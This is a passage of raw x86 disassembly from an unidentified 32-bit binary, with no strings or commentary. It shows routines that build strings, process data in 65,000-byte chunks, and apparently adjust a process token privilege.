  40c96b:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40c96e:	50                   	push   %eax
  40c96f:	e8 5f 24 00 00       	call   0x40edd3
  40c974:	59                   	pop    %ecx
  40c975:	59                   	pop    %ecx
  40c976:	50                   	push   %eax
  40c977:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40c97a:	50                   	push   %eax
  40c97b:	e8 a0 32 00 00       	call   0x40fc20
  40c980:	83 c4 0c             	add    $0xc,%esp
  40c983:	50                   	push   %eax
  40c984:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40c987:	50                   	push   %eax
  40c988:	e8 93 32 00 00       	call   0x40fc20
  40c98d:	83 c4 0c             	add    $0xc,%esp
  40c990:	50                   	push   %eax
  40c991:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40c994:	50                   	push   %eax
  40c995:	e8 86 32 00 00       	call   0x40fc20
  40c99a:	83 c4 0c             	add    $0xc,%esp
  40c99d:	b9 20 5a 41 00       	mov    $0x415a20,%ecx
  40c9a2:	50                   	push   %eax
  40c9a3:	ff 15 94 02 41 00    	call   *0x410294
  40c9a9:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  40c9ac:	ff 15 54 02 41 00    	call   *0x410254
  40c9b2:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40c9b5:	ff 15 54 02 41 00    	call   *0x410254
  40c9bb:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40c9be:	ff 15 54 02 41 00    	call   *0x410254
  40c9c4:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40c9c7:	ff 15 54 02 41 00    	call   *0x410254
  40c9cd:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40c9d0:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c9d6:	6a 01                	push   $0x1
  40c9d8:	58                   	pop    %eax
  40c9d9:	c9                   	leave
  40c9da:	c2 08 00             	ret    $0x8
  40c9dd:	55                   	push   %ebp
  40c9de:	8b ec                	mov    %esp,%ebp
  40c9e0:	83 ec 10             	sub    $0x10,%esp
  40c9e3:	56                   	push   %esi
  40c9e4:	6a 00                	push   $0x0
  40c9e6:	68 f3 c8 40 00       	push   $0x40c8f3
  40c9eb:	ff 15 1c 04 41 00    	call   *0x41041c
  40c9f1:	83 ec 10             	sub    $0x10,%esp
  40c9f4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40c9f7:	8b f4                	mov    %esp,%esi
  40c9f9:	68 20 5a 41 00       	push   $0x415a20
  40c9fe:	68 68 52 41 00       	push   $0x415268
  40ca03:	68 38 17 41 00       	push   $0x411738
  40ca08:	50                   	push   %eax
  40ca09:	e8 0c 32 00 00       	call   0x40fc1a
  40ca0e:	83 c4 0c             	add    $0xc,%esp
  40ca11:	50                   	push   %eax
  40ca12:	56                   	push   %esi
  40ca13:	e8 fc 31 00 00       	call   0x40fc14
  40ca18:	83 c4 0c             	add    $0xc,%esp
  40ca1b:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40ca20:	e8 73 57 ff ff       	call   0x402198
  40ca25:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ca28:	ff 15 54 02 41 00    	call   *0x410254
  40ca2e:	68 68 06 41 00       	push   $0x410668
  40ca33:	b9 20 5a 41 00       	mov    $0x415a20,%ecx
  40ca38:	ff 15 d8 02 41 00    	call   *0x4102d8
  40ca3e:	5e                   	pop    %esi
  40ca3f:	c9                   	leave
  40ca40:	c3                   	ret
  40ca41:	55                   	push   %ebp
  40ca42:	8b ec                	mov    %esp,%ebp
  40ca44:	83 ec 14             	sub    $0x14,%esp
  40ca47:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40ca4a:	56                   	push   %esi
  40ca4b:	50                   	push   %eax
  40ca4c:	6a 28                	push   $0x28
  40ca4e:	ff 15 d8 00 41 00    	call   *0x4100d8
  40ca54:	50                   	push   %eax
  40ca55:	ff 15 00 00 41 00    	call   *0x410000
  40ca5b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40ca5e:	33 f6                	xor    %esi,%esi
  40ca60:	50                   	push   %eax
  40ca61:	68 44 17 41 00       	push   $0x411744
  40ca66:	56                   	push   %esi
  40ca67:	ff 15 04 00 41 00    	call   *0x410004
  40ca6d:	56                   	push   %esi
  40ca6e:	56                   	push   %esi
  40ca6f:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40ca72:	56                   	push   %esi
  40ca73:	50                   	push   %eax
  40ca74:	56                   	push   %esi
  40ca75:	ff 75 fc             	push   -0x4(%ebp)
  40ca78:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  40ca7f:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%ebp)
  40ca86:	ff 15 08 00 41 00    	call   *0x410008
  40ca8c:	ff 15 3c 01 41 00    	call   *0x41013c
  40ca92:	f7 d8                	neg    %eax
  40ca94:	1b c0                	sbb    %eax,%eax
  40ca96:	5e                   	pop    %esi
  40ca97:	f7 d8                	neg    %eax
  40ca99:	c9                   	leave
  40ca9a:	c3                   	ret
  40ca9b:	55                   	push   %ebp
  40ca9c:	8b ec                	mov    %esp,%ebp
  40ca9e:	81 ec fc 01 00 00    	sub    $0x1fc,%esp
  40caa4:	53                   	push   %ebx
  40caa5:	56                   	push   %esi
  40caa6:	57                   	push   %edi
  40caa7:	6a 01                	push   $0x1
  40caa9:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  40caaf:	e8 2d 56 ff ff       	call   0x4020e1
  40cab4:	bb e8 fd 00 00       	mov    $0xfde8,%ebx
  40cab9:	6a 01                	push   $0x1
  40cabb:	6a 24                	push   $0x24
  40cabd:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40cac0:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40cac3:	ff 15 58 02 41 00    	call   *0x410258
  40cac9:	50                   	push   %eax
  40caca:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40cad0:	ff 15 f4 02 41 00    	call   *0x4102f4
  40cad6:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40cadc:	ff 15 f0 02 41 00    	call   *0x4102f0
  40cae2:	84 c0                	test   %al,%al
  40cae4:	0f 84 01 03 00 00    	je     0x40cdeb
  40caea:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40caed:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40caf3:	50                   	push   %eax
  40caf4:	ff 15 ec 02 41 00    	call   *0x4102ec
  40cafa:	8b c8                	mov    %eax,%ecx
  40cafc:	e8 87 87 ff ff       	call   0x405288
  40cb01:	83 ec 10             	sub    $0x10,%esp
  40cb04:	be 78 52 41 00       	mov    $0x415278,%esi
  40cb09:	8b fc                	mov    %esp,%edi
  40cb0b:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  40cb11:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40cb12:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40cb13:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40cb14:	99                   	cltd
  40cb15:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40cb18:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40cb1b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40cb1e:	89 55 f8             	mov    %edx,-0x8(%ebp)
  40cb21:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40cb22:	e8 41 56 ff ff       	call   0x402168
  40cb27:	33 f6                	xor    %esi,%esi
  40cb29:	c7 45 e8 01 00 00 00 	movl   $0x1,-0x18(%ebp)
  40cb30:	56                   	push   %esi
  40cb31:	53                   	push   %ebx
  40cb32:	ff 75 e4             	push   -0x1c(%ebp)
  40cb35:	ff 75 e0             	push   -0x20(%ebp)
  40cb38:	e8 e3 31 00 00       	call   0x40fd20
  40cb3d:	8b f8                	mov    %eax,%edi
  40cb3f:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40cb42:	47                   	inc    %edi
  40cb43:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  40cb46:	0f 82 68 02 00 00    	jb     0x40cdb4
  40cb4c:	77 09                	ja     0x40cb57
  40cb4e:	39 75 e0             	cmp    %esi,-0x20(%ebp)
  40cb51:	0f 86 5d 02 00 00    	jbe    0x40cdb4
  40cb57:	be 68 52 41 00       	mov    $0x415268,%esi
  40cb5c:	33 c0                	xor    %eax,%eax
  40cb5e:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  40cb61:	72 0d                	jb     0x40cb70
  40cb63:	77 05                	ja     0x40cb6a
  40cb65:	3b 5d f4             	cmp    -0xc(%ebp),%ebx
  40cb68:	76 06                	jbe    0x40cb70
  40cb6a:	8b 5d f4             	mov    -0xc(%ebp),%ebx
  40cb6d:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  40cb70:	53                   	push   %ebx
  40cb71:	e8 56 31 00 00       	call   0x40fccc
  40cb76:	59                   	pop    %ecx
  40cb77:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40cb7a:	6a 00                	push   $0x0
  40cb7c:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40cb82:	ff 75 fc             	push   -0x4(%ebp)
  40cb85:	ff 15 e8 02 41 00    	call   *0x4102e8
  40cb8b:	53                   	push   %ebx
  40cb8c:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40cb92:	ff 75 f0             	push   -0x10(%ebp)
  40cb95:	ff 15 e4 02 41 00    	call   *0x4102e4
  40cb9b:	8d 45 ef             	lea    -0x11(%ebp),%eax
  40cb9e:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40cba1:	50                   	push   %eax
  40cba2:	53                   	push   %ebx
  40cba3:	ff 75 f0             	push   -0x10(%ebp)
  40cba6:	ff 15 70 02 41 00    	call   *0x410270
  40cbac:	83 ec 10             	sub    $0x10,%esp
  40cbaf:	8b dc                	mov    %esp,%ebx
  40cbb1:	50                   	push   %eax
  40cbb2:	8d 45 38             	lea    0x38(%ebp),%eax
  40cbb5:	56                   	push   %esi
  40cbb6:	50                   	push   %eax
  40cbb7:	56                   	push   %esi
  40cbb8:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40cbbb:	57                   	push   %edi
  40cbbc:	50                   	push   %eax
  40cbbd:	e8 73 21 00 00       	call   0x40ed35
  40cbc2:	59                   	pop    %ecx
  40cbc3:	59                   	pop    %ecx
  40cbc4:	50                   	push   %eax
  40cbc5:	56                   	push   %esi
  40cbc6:	ff 75 e8             	push   -0x18(%ebp)
  40cbc9:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40cbcc:	50                   	push   %eax
  40cbcd:	e8 63 21 00 00       	call   0x40ed35
  40cbd2:	59                   	pop    %ecx
  40cbd3:	59                   	pop    %ecx
  40cbd4:	50                   	push   %eax
  40cbd5:	8d 45 28             	lea    0x28(%ebp),%eax
  40cbd8:	56                   	push   %esi
  40cbd9:	50                   	push   %eax
  40cbda:	8d 45 18             	lea    0x18(%ebp),%eax
  40cbdd:	56                   	push   %esi
  40cbde:	50                   	push   %eax
  40cbdf:	8d 45 08             	lea    0x8(%ebp),%eax
  40cbe2:	56                   	push   %esi
  40cbe3:	50                   	push   %eax
  40cbe4:	56                   	push   %esi
  40cbe5:	8d 85 54 ff ff ff    	lea    -0xac(%ebp),%eax
  40cbeb:	68 68 17 41 00       	push   $0x411768
  40cbf0:	50                   	push   %eax
  40cbf1:	e8 24 30 00 00       	call   0x40fc1a
  40cbf6:	83 c4 0c             	add    $0xc,%esp
  40cbf9:	50                   	push   %eax
  40cbfa:	8d 85 74 ff ff ff    	lea    -0x8c(%ebp),%eax
  40cc00:	50                   	push   %eax
  40cc01:	e8 0e 30 00 00       	call   0x40fc14
  40cc06:	83 c4 0c             	add    $0xc,%esp
  40cc09:	50                   	push   %eax
  40cc0a:	8d 45 84             	lea    -0x7c(%ebp),%eax
  40cc0d:	50                   	push   %eax
  40cc0e:	e8 01 30 00 00       	call   0x40fc14
  40cc13:	83 c4 0c             	add    $0xc,%esp
  40cc16:	50                   	push   %eax
  40cc17:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  40cc1d:	50                   	push   %eax
  40cc1e:	e8 f1 2f 00 00       	call   0x40fc14
  40cc23:	83 c4 0c             	add    $0xc,%esp
  40cc26:	50                   	push   %eax
  40cc27:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
  40cc2d:	50                   	push   %eax
  40cc2e:	e8 e1 2f 00 00       	call   0x40fc14
  40cc33:	83 c4 0c             	add    $0xc,%esp
  40cc36:	50                   	push   %eax
  40cc37:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
  40cc3d:	50                   	push   %eax
  40cc3e:	e8 d1 2f 00 00       	call   0x40fc14
  40cc43:	83 c4 0c             	add    $0xc,%esp
  40cc46:	50                   	push   %eax
  40cc47:	8d 85 04 ff ff ff    	lea    -0xfc(%ebp),%eax
  40cc4d:	50                   	push   %eax
  40cc4e:	e8 c1 2f 00 00       	call   0x40fc14
  40cc53:	83 c4 0c             	add    $0xc,%esp
  40cc56:	50                   	push   %eax
  40cc57:	8d 45 94             	lea    -0x6c(%ebp),%eax
  40cc5a:	50                   	push   %eax
  40cc5b:	e8 b4 2f 00 00       	call   0x40fc14
  40cc60:	83 c4 0c             	add    $0xc,%esp
  40cc63:	50                   	push   %eax
  40cc64:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
  40cc6a:	50                   	push   %eax
  40cc6b:	e8 a4 2f 00 00       	call   0x40fc14
  40cc70:	83 c4 0c             	add    $0xc,%esp
  40cc73:	50                   	push   %eax
  40cc74:	8d 85 f4 fe ff ff    	lea    -0x10c(%ebp),%eax
  40cc7a:	50                   	push   %eax
  40cc7b:	e8 94 2f 00 00       	call   0x40fc14
  40cc80:	83 c4 0c             	add    $0xc,%esp
  40cc83:	50                   	push   %eax
  40cc84:	8d 85 14 ff ff ff    	lea    -0xec(%ebp),%eax
  40cc8a:	50                   	push   %eax
  40cc8b:	e8 84 2f 00 00       	call   0x40fc14
  40cc90:	83 c4 0c             	add    $0xc,%esp
  40cc93:	50                   	push   %eax
  40cc94:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  40cc9a:	50                   	push   %eax
  40cc9b:	e8 74 2f 00 00       	call   0x40fc14
  40cca0:	83 c4 0c             	add    $0xc,%esp
  40cca3:	50                   	push   %eax
  40cca4:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  40ccaa:	50                   	push   %eax
  40ccab:	e8 64 2f 00 00       	call   0x40fc14
  40ccb0:	83 c4 0c             	add    $0xc,%esp
  40ccb3:	50                   	push   %eax
  40ccb4:	53                   	push   %ebx
  40ccb5:	e8 5a 2f 00 00       	call   0x40fc14
  40ccba:	83 c4 0c             	add    $0xc,%esp
  40ccbd:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  40ccc3:	e8 d0 54 ff ff       	call   0x402198
  40ccc8:	83 f8 ff             	cmp    $0xffffffff,%eax
  40cccb:	8d 8d 64 ff ff ff    	lea    -0x9c(%ebp),%ecx
  40ccd1:	0f 94 c3             	sete   %bl
  40ccd4:	ff 15 54 02 41 00    	call   *0x410254
  40ccda:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  40cce0:	ff 15 54 02 41 00    	call   *0x410254
  40cce6:	8d 8d 14 ff ff ff    	lea    -0xec(%ebp),%ecx
  40ccec:	ff 15 54 02 41 00    	call   *0x410254
  40ccf2:	8d 8d f4 fe ff ff    	lea    -0x10c(%ebp),%ecx
  40ccf8:	ff 15 54 02 41 00    	call   *0x410254
  40ccfe:	8d 8d e4 fe ff ff    	lea    -0x11c(%ebp),%ecx
  40cd04:	ff 15 54 02 41 00    	call   *0x410254
  40cd0a:	8d 4d 94             	lea    -0x6c(%ebp),%ecx
  40cd0d:	ff 15 54 02 41 00    	call   *0x410254
  40cd13:	8d 8d 04 ff ff ff    	lea    -0xfc(%ebp),%ecx
  40cd19:	ff 15 54 02 41 00    	call   *0x410254
  40cd1f:	8d 8d 44 ff ff ff    	lea    -0xbc(%ebp),%ecx
  40cd25:	ff 15 54 02 41 00    	call   *0x410254
  40cd2b:	8d 8d d4 fe ff ff    	lea    -0x12c(%ebp),%ecx
  40cd31:	ff 15 54 02 41 00    	call   *0x410254
  40cd37:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  40cd3d:	ff 15 54 02 41 00    	call   *0x410254
  40cd43:	8d 4d 84             	lea    -0x7c(%ebp),%ecx
  40cd46:	ff 15 54 02 41 00    	call   *0x410254
  40cd4c:	8d 8d 74 ff ff ff    	lea    -0x8c(%ebp),%ecx
  40cd52:	ff 15 54 02 41 00    	call   *0x410254
  40cd58:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  40cd5e:	ff 15 54 02 41 00    	call   *0x410254
  40cd64:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40cd67:	ff 15 54 02 41 00    	call   *0x410254
  40cd6d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40cd70:	ff 15 54 02 41 00    	call   *0x410254
  40cd76:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40cd79:	ff 15 54 02 41 00    	call   *0x410254
  40cd7f:	84 db                	test   %bl,%bl
  40cd81:	75 4f                	jne    0x40cdd2
  40cd83:	ff 75 f0             	push   -0x10(%ebp)
  40cd86:	e8 a1 2e 00 00       	call   0x40fc2c
  40cd8b:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  40cd8e:	59                   	pop    %ecx
  40cd8f:	29 5d f4             	sub    %ebx,-0xc(%ebp)
  40cd92:	83 5d f8 00          	sbbl   $0x0,-0x8(%ebp)
  40cd96:	01 5d fc             	add    %ebx,-0x4(%ebp)
  40cd99:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40cd9c:	ff 45 e8             	incl   -0x18(%ebp)
  40cd9f:	99                   	cltd
  40cda0:	3b 55 e4             	cmp    -0x1c(%ebp),%edx
  40cda3:	0f 82 b3 fd ff ff    	jb     0x40cb5c
  40cda9:	77 09                	ja     0x40cdb4
  40cdab:	3b 45 e0             	cmp    -0x20(%ebp),%eax
  40cdae:	0f 82 a8 fd ff ff    	jb     0x40cb5c
  40cdb4:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40cdba:	ff 15 e0 02 41 00    	call   *0x4102e0
  40cdc0:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  40cdc6:	e8 fc 53 ff ff       	call   0x4021c7
  40cdcb:	b3 01                	mov    $0x1,%bl
  40cdcd:	e9 89 00 00 00       	jmp    0x40ce5b
  40cdd2:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  40cdd8:	e8 ea 53 ff ff       	call   0x4021c7
  40cddd:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40cde3:	ff 15 e0 02 41 00    	call   *0x4102e0
  40cde9:	eb 6e                	jmp    0x40ce59
  40cdeb:	83 ec 10             	sub    $0x10,%esp
  40cdee:	8d 45 18             	lea    0x18(%ebp),%eax
  40cdf1:	8b fc                	mov    %esp,%edi
  40cdf3:	be 68 52 41 00       	mov    $0x415268,%esi
  40cdf8:	50                   	push   %eax
  40cdf9:	8d 45 38             	lea    0x38(%ebp),%eax
  40cdfc:	56                   	push   %esi
  40cdfd:	50                   	push   %eax
  40cdfe:	56                   	push   %esi
  40cdff:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40ce02:	68 58 17 41 00       	push   $0x411758
  40ce07:	50                   	push   %eax
  40ce08:	e8 0d 2e 00 00       	call   0x40fc1a
  40ce0d:	83 c4 0c             	add    $0xc,%esp
  40ce10:	50                   	push   %eax
  40ce11:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40ce14:	50                   	push   %eax
  40ce15:	e8 fa 2d 00 00       	call   0x40fc14
  40ce1a:	83 c4 0c             	add    $0xc,%esp
  40ce1d:	50                   	push   %eax
  40ce1e:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40ce21:	50                   	push   %eax
  40ce22:	e8 ed 2d 00 00       	call   0x40fc14
  40ce27:	83 c4 0c             	add    $0xc,%esp
  40ce2a:	50                   	push   %eax
  40ce2b:	57                   	push   %edi
  40ce2c:	e8 e3 2d 00 00       	call   0x40fc14
  40ce31:	83 c4 0c             	add    $0xc,%esp
  40ce34:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40ce39:	e8 5a 53 ff ff       	call   0x402198
  40ce3e:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40ce41:	ff 15 54 02 41 00    	call   *0x410254
  40ce47:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40ce4a:	ff 15 54 02 41 00    	call   *0x410254
  40ce50:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40ce53:	ff 15 54 02 41 00    	call   *0x410254
  40ce59:	32 db                	xor    %bl,%bl
  40ce5b:	8d 8d 04 fe ff ff    	lea    -0x1fc(%ebp),%ecx
  40ce61:	ff 15 dc 02 41 00    	call   *0x4102dc
  40ce67:	8d 8d 94 fe ff ff    	lea    -0x16c(%ebp),%ecx
  40ce6d:	e8 64 53 ff ff       	call   0x4021d6
  40ce72:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40ce75:	ff 15 54 02 41 00    	call   *0x410254
  40ce7b:	8d 4d 18             	lea    0x18(%ebp),%ecx
  40ce7e:	ff 15 54 02 41 00    	call   *0x410254
  40ce84:	8d 4d 28             	lea    0x28(%ebp),%ecx
  40ce87:	ff 15 54 02 41 00    	call   *0x410254
  40ce8d:	8d 4d 38             	lea    0x38(%ebp),%ecx
  40ce90:	ff 15 54 02 41 00    	call   *0x410254
  40ce96:	5f                   	pop    %edi
  40ce97:	8a c3                	mov    %bl,%al
  40ce99:	5e                   	pop    %esi
  40ce9a:	5b                   	pop    %ebx
  40ce9b:	c9                   	leave
  40ce9c:	c3                   	ret
  40ce9d:	55                   	push   %ebp
  40ce9e:	8b ec                	mov    %esp,%ebp
  40cea0:	56                   	push   %esi
  40cea1:	8b f1                	mov    %ecx,%esi
  40cea3:	ff 75 08             	push   0x8(%ebp)
  40cea6:	e8 8c b7 ff ff       	call   0x408637
  40ceab:	50                   	push   %eax
  40ceac:	8b ce                	mov    %esi,%ecx
  40ceae:	e8 05 00 00 00       	call   0x40ceb8
  40ceb3:	5e                   	pop    %esi
  40ceb4:	5d                   	pop    %ebp
  40ceb5:	c2 04 00             	ret    $0x4
  40ceb8:	55                   	push   %ebp
  40ceb9:	8b ec                	mov    %esp,%ebp
  40cebb:	56                   	push   %esi
  40cebc:	57                   	push   %edi
  40cebd:	8b f9                	mov    %ecx,%edi
  40cebf:	e8 6f b7 ff ff       	call   0x408633
  40cec4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40cec7:	6a 0c                	push   $0xc
  40cec9:	2b c8                	sub    %eax,%ecx
  40cecb:	8b c1                	mov    %ecx,%eax
  40cecd:	59                   	pop    %ecx
  40cece:	99                   	cltd
  40cecf:	f7 f9                	idiv   %ecx
  40ced1:	ff 75 0c             	push   0xc(%ebp)
  40ced4:	8b cf                	mov    %edi,%ecx
  40ced6:	6a 01                	push   $0x1
  40ced8:	ff 75 08             	push   0x8(%ebp)
  40cedb:	8b f0                	mov    %eax,%esi
  40cedd:	e8 13 00 00 00       	call   0x40cef5
  40cee2:	8b cf                	mov    %edi,%ecx
  40cee4:	e8 4a b7 ff ff       	call   0x408633
  40cee9:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  40ceec:	5f                   	pop    %edi
  40ceed:	5e                   	pop    %esi
  40ceee:	8d 04 88             	lea    (%eax,%ecx,4),%eax
  40cef1:	5d                   	pop    %ebp
  40cef2:	c2 08 00             	ret    $0x8
  40cef5:	55                   	push   %ebp
  40cef6:	8b ec                	mov    %esp,%ebp
  40cef8:	51                   	push   %ecx
  40cef9:	53                   	push   %ebx
  40cefa:	56                   	push   %esi
  40cefb:	8b f1                	mov    %ecx,%esi
  40cefd:	57                   	push   %edi
  40cefe:	6a 0c                	push   $0xc
  40cf00:	8b 4e 08             	mov    0x8(%esi),%ecx
  40cf03:	8b 46 0c             	mov    0xc(%esi),%eax
  40cf06:	2b c1                	sub    %ecx,%eax
  40cf08:	5f                   	pop    %edi
  40cf09:	99                   	cltd
  40cf0a:	f7 ff                	idiv   %edi
  40cf0c:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40cf0f:	3b c7                	cmp    %edi,%eax
  40cf11:	0f 83 b3 00 00 00    	jae    0x40cfca
  40cf17:	8b ce                	mov    %esi,%ecx
  40cf19:	e8 38 66 ff ff       	call   0x403556
  40cf1e:	3b f8                	cmp    %eax,%edi
  40cf20:	73 0c                	jae    0x40cf2e
  40cf22:	8b ce                	mov    %esi,%ecx
  40cf24:	e8 2d 66 ff ff       	call   0x403556
  40cf29:	89 45 0c             	mov    %eax,0xc(%ebp)
  40cf2c:	eb 03                	jmp    0x40cf31
  40cf2e:	89 7d 0c             	mov    %edi,0xc(%ebp)
  40cf31:	8b ce                	mov    %esi,%ecx
  40cf33:	e8 1e 66 ff ff       	call   0x403556
  40cf38:	8b d8                	mov    %eax,%ebx
  40cf3a:	6a 00                	push   $0x0
  40cf3c:	03 5d 0c             	add    0xc(%ebp),%ebx
  40cf3f:	8b ce                	mov    %esi,%ecx
  40cf41:	53                   	push   %ebx
  40cf42:	e8 6e 01 00 00       	call   0x40d0b5
  40cf47:	50                   	push   %eax
  40cf48:	8b ce                	mov    %esi,%ecx
  40cf4a:	ff 75 08             	push   0x8(%ebp)
  40cf4d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40cf50:	ff 76 04             	push   0x4(%esi)
  40cf53:	e8 09 01 00 00       	call   0x40d061
  40cf58:	ff 75 10             	push   0x10(%ebp)
  40cf5b:	8b ce                	mov    %esi,%ecx
  40cf5d:	89 45 0c             	mov    %eax,0xc(%ebp)
  40cf60:	57                   	push   %edi
  40cf61:	50                   	push   %eax
  40cf62:	e8 26 01 00 00       	call   0x40d08d
  40cf67:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40cf6a:	8d 04 7f             	lea    (%edi,%edi,2),%eax
  40cf6d:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  40cf70:	8b ce                	mov    %esi,%ecx
  40cf72:	50                   	push   %eax
  40cf73:	ff 76 08             	push   0x8(%esi)
  40cf76:	ff 75 08             	push   0x8(%ebp)
  40cf79:	e8 e3 00 00 00       	call   0x40d061
  40cf7e:	ff 76 08             	push   0x8(%esi)
  40cf81:	8b ce                	mov    %esi,%ecx
  40cf83:	ff 76 04             	push   0x4(%esi)
  40cf86:	e8 46 66 ff ff       	call   0x4035d1
  40cf8b:	8b 4e 04             	mov    0x4(%esi),%ecx
  40cf8e:	8b 46 0c             	mov    0xc(%esi),%eax
  40cf91:	2b c1                	sub    %ecx,%eax
  40cf93:	6a 0c                	push   $0xc
  40cf95:	99                   	cltd
  40cf96:	59                   	pop    %ecx
  40cf97:	f7 f9                	idiv   %ecx
  40cf99:	8b ce                	mov    %esi,%ecx
  40cf9b:	50                   	push   %eax
  40cf9c:	ff 76 04             	push   0x4(%esi)
  40cf9f:	e8 82 66 ff ff       	call   0x403626
  40cfa4:	8d 04 5b             	lea    (%ebx,%ebx,2),%eax
  40cfa7:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40cfaa:	8b ce                	mov    %esi,%ecx
  40cfac:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  40cfaf:	89 46 0c             	mov    %eax,0xc(%esi)
  40cfb2:	e8 9f 65 ff ff       	call   0x403556
  40cfb7:	03 c7                	add    %edi,%eax
  40cfb9:	89 5e 04             	mov    %ebx,0x4(%esi)
  40cfbc:	8d 04 40             	lea    (%eax,%eax,2),%eax
  40cfbf:	8d 04 83             	lea    (%ebx,%eax,4),%eax
  40cfc2:	89 46 08             	mov    %eax,0x8(%esi)
  40cfc5:	e9 90 00 00 00       	jmp    0x40d05a
  40cfca:	8b c1                	mov    %ecx,%eax
  40cfcc:	6a 0c                	push   $0xc
  40cfce:	2b 45 08             	sub    0x8(%ebp),%eax
  40cfd1:	5b                   	pop    %ebx
  40cfd2:	99                   	cltd
  40cfd3:	f7 fb                	idiv   %ebx
  40cfd5:	3b c7                	cmp    %edi,%eax
  40cfd7:	73 48                	jae    0x40d021
  40cfd9:	8b 45 08             	mov    0x8(%ebp),%eax
  40cfdc:	8d 1c 7f             	lea    (%edi,%edi,2),%ebx
  40cfdf:	c1 e3 02             	shl    $0x2,%ebx
  40cfe2:	8d 14 03             	lea    (%ebx,%eax,1),%edx
  40cfe5:	52                   	push   %edx
  40cfe6:	51                   	push   %ecx
  40cfe7:	50                   	push   %eax
  40cfe8:	8b ce                	mov    %esi,%ecx
  40cfea:	e8 72 00 00 00       	call   0x40d061
  40cfef:	8b 46 08             	mov    0x8(%esi),%eax
  40cff2:	ff 75 10             	push   0x10(%ebp)
  40cff5:	2b 45 08             	sub    0x8(%ebp),%eax
  40cff8:	6a 0c                	push   $0xc
  40cffa:	99                   	cltd
  40cffb:	59                   	pop    %ecx
  40cffc:	f7 f9                	idiv   %ecx
  40cffe:	8b ce                	mov    %esi,%ecx
  40d000:	2b f8                	sub    %eax,%edi
  40d002:	57                   	push   %edi
  40d003:	ff 76 08             	push   0x8(%esi)
  40d006:	e8 82 00 00 00       	call   0x40d08d
  40d00b:	ff 75 10             	push   0x10(%ebp)
  40d00e:	ff 76 08             	push   0x8(%esi)
  40d011:	ff 75 08             	push   0x8(%ebp)
